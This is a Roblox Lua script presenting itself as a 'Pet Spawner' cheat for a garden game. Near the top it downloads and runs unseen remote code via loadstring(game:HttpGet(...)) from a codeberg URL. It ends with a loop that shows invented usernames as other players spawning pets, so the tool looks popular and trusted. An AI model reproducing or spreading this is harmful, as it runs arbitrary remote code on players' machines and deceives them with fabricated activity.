local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

-- Load Spawner
local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()

-- Create ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "PetSpawnerUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = PlayerGui

-- Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 300, 0, 220)
MainFrame.Position = UDim2.new(0.5, -150, 0.5, -110)
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

-- Make UI Draggable
MainFrame.Active = true
MainFrame.Draggable = true

-- Title
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Title.Text = "Pet Spawner"
Title.TextColor3 = Color3.fromRGB(200, 255, 200)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18
Title.Parent = MainFrame

-- Inputs
local function createInput(placeholder, pos)
	local box = Instance.new("TextBox")
	box.PlaceholderText = placeholder
	box.Position = pos
	box.Size = UDim2.new(1, -20, 0, 25)
	box.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	box.TextColor3 = Color3.fromRGB(255, 255, 255)
	box.Font = Enum.Font.Gotham
	box.TextSize = 14
	box.Parent = MainFrame
	return box
end

local PetNameInput = createInput("Pet Name", UDim2.new(0, 10, 0, 40))
local KgInput = createInput("Weight (kg)", UDim2.new(0, 10, 0, 70))
local AgeInput = createInput("Age", UDim2.new(0, 10, 0, 100))

-- Buttons
local function createButton(text, pos)
	local btn = Instance.new("TextButton")
	btn.Text = text
	btn.Position = pos
	btn.Size = UDim2.new(0.5, -15, 0, 30)
	btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	btn.Font = Enum.Font.GothamSemibold
	btn.TextSize = 14
	btn.Parent = MainFrame
	return btn
end

local SpawnBtn = createButton("Spawn Pet", UDim2.new(0, 10, 0, 130))
local SeedBtn = createButton("Spawn Seed", UDim2.new(0.5, 5, 0, 130))
local EggBtn = createButton("Spawn Egg", UDim2.new(0, 10, 0, 170))

-- Online user counter
local OnlineUsers = Instance.new("TextLabel")
OnlineUsers.Size = UDim2.new(0, 100, 0, 20)
OnlineUsers.Position = UDim2.new(1, -105, 0, 5)
OnlineUsers.BackgroundTransparency = 1
OnlineUsers.Text = "Online: " .. tostring(#Players:GetPlayers())
OnlineUsers.TextColor3 = Color3.fromRGB(150, 255, 150)
OnlineUsers.Font = Enum.Font.Gotham
OnlineUsers.TextSize = 12
OnlineUsers.TextXAlignment = Enum.TextXAlignment.Right
OnlineUsers.Parent = Title

-- Notification Bar
local NotificationBar = Instance.new("TextLabel")
NotificationBar.Size = UDim2.new(1, 0, 0, 20)
NotificationBar.Position = UDim2.new(0, 0, 1, -20)
NotificationBar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
NotificationBar.TextColor3 = Color3.fromRGB(180, 255, 180)
NotificationBar.Font = Enum.Font.Gotham
NotificationBar.TextSize = 14
NotificationBar.Text = ""
NotificationBar.Parent = MainFrame

-- Spawn Functions
SpawnBtn.MouseButton1Click:Connect(function()
	local pet = PetNameInput.Text ~= "" and PetNameInput.Text or "Raccoon"
	local kg = tonumber(KgInput.Text) or 1
	local age = tonumber(AgeInput.Text) or 1
	Spawner.SpawnPet(pet, kg, age)
	NotificationBar.Text = Player.Name .. " spawned a " .. pet .. " (" .. kg .. "kg, " .. age .. "y)"
end)

SeedBtn.MouseButton1Click:Connect(function()
	Spawner.SpawnSeed("Candy Blossom")
end)

EggBtn.MouseButton1Click:Connect(function()
	Spawner.SpawnEgg("Night Egg")
end)

-- Simulate bot activity
local fakeUsers = {"GhostWizard2048", "GhostKid4639", "NinjaTiger4248", "EpicKid3836", "FireHunter8813", "LuckyKnight6497"}
local pets = {"Night Fox", "Bubble Cat", "Leaf Dragon", "Mossy Pig"}

while true do
	task.wait(math.random(4, 8))
	local bot = fakeUsers[math.random(1, #fakeUsers)]
	local pet = pets[math.random(1, #pets)]
	local kg = math.random(1, 5)
	local age = math.random(1, 10)
	NotificationBar.Text = bot .. " spawned a " .. pet .. " (" .. kg .. "kg, " .. age .. "y)"
end
